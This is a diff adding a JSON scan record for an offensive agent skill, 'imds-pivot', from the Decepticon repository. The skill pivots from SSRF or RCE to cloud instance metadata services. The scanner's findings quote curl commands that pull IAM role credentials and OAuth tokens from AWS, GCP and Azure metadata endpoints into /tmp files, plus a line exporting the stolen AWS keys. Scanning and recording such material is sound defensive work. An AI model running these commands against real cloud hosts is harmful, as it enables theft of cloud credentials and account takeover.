@@ -1,0 +1,255 @@
+{
+  "id": "bittersecurity__decepticon__packages~decepticon~decepticon~skills~standard~cloud~imds-pivot",
+  "owner": "BitterSecurity",
+  "repo": "Decepticon",
+  "path": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot",
+  "name": "imds-pivot",
+  "description": "Pivot from SSRF or RCE to cloud Instance Metadata Service (IMDS) — extract IAM role creds, instance identity, user-data secrets.",
+  "stars": 6567,
+  "category": "coding",
+  "commit": "df879550544d36b6b1e69062f05adae28537adf2",
+  "contentHash": "54c777f50df13cb2633805cffe7b1266d6f7d59a8adfe8869457fb26cbc2c281",
+  "repoCreatedAt": "2025-06-06T12:55:02Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-08T09:45:03.483Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 39,
+        "excerpt": "ROLE=$(curl -s \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 39,
+        "excerpt": "ROLE=$(curl -s \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 40,
+        "excerpt": "curl -s \"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\" > /tmp/creds.json",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 45,
+        "excerpt": "TOKEN=$(curl -s -X PUT \"http://169.254.169.254/latest/api/token\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 45,
+        "excerpt": "TOKEN=$(curl -s -X PUT \"http://169.254.169.254/latest/api/token\" \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 47,
+        "excerpt": "ROLE=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 49,
+        "excerpt": "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 65,
+        "excerpt": "export AWS_ACCESS_KEY_ID=$(jq -r .AccessKeyId /tmp/creds.json)",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 74,
+        "excerpt": "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 74,
+        "excerpt": "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 85,
+        "excerpt": "H='Metadata-Flavor: Google'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 88,
+        "excerpt": "curl -s -H \"$H\" 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "metadata.google.internal"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 91,
+        "excerpt": "curl -s -H \"$H\" 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' > /tmp/gcp.json",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "metadata.google.internal"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 95,
+        "excerpt": "curl -s -H \"Authorization: Bearer $TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 99,
+        "excerpt": "curl -s -H \"$H\" 'http://metadata.google.internal/computeMetadata/v1/project/project-id'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "metadata.google.internal"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 102,
+        "excerpt": "curl -s -H \"$H\" 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "metadata.google.internal"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 107,
+        "excerpt": "H='Metadata: true'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 110,
+        "excerpt": "curl -s -H \"$H\" 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 113,
+        "excerpt": "curl -s -H \"$H\" 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' > /tmp/azure.json",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254",
+          "management.azure.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 117,
+        "excerpt": "curl -s -H \"Authorization: Bearer $TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 121,
+        "excerpt": "curl -s -H \"$H\" 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254",
+          "storage.azure.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 124,
+        "excerpt": "curl -s -H \"$H\" 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254",
+          "vault.azure.net"
+        ]
+      }
+    ],
+    "findingTotals": {
+      "network": 16,
+      "shell": 6
+    },
+    "score": 92,
+    "band": "low",
+    "rulesVersion": "1.3.0",
+    "filesScanned": 1,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "df879550544d36b6b1e69062f05adae28537adf2",
+      "scannedAt": "2026-11-08T09:45:03.483Z",
+      "score": 92,
+      "rulesVersion": "1.3.0"
+    }
+  ]
+}
